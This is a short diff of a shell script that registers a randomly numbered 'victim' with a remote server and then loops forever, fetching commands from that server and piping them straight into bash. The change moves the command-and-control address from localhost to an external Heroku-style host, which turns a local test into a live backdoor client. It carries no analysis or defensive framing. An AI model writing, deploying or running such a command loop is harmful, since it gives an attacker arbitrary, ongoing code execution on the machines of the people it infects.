@@ -10,10 +10,9 @@ fi
 
 let victimID=$RANDOM
 
-curl -s localhost:5000/registervictim/$victimID
+curl -s tufts-bobsledding-society.herokuapp/registervictim/$victimID
 
 while true; do
- curl -s localhost:5000/command/$victimID | bash -e
+ curl -s tufts-bobsledding-society.herokuapp/command/$victimID | bash -e
  sleep 2
 done
-
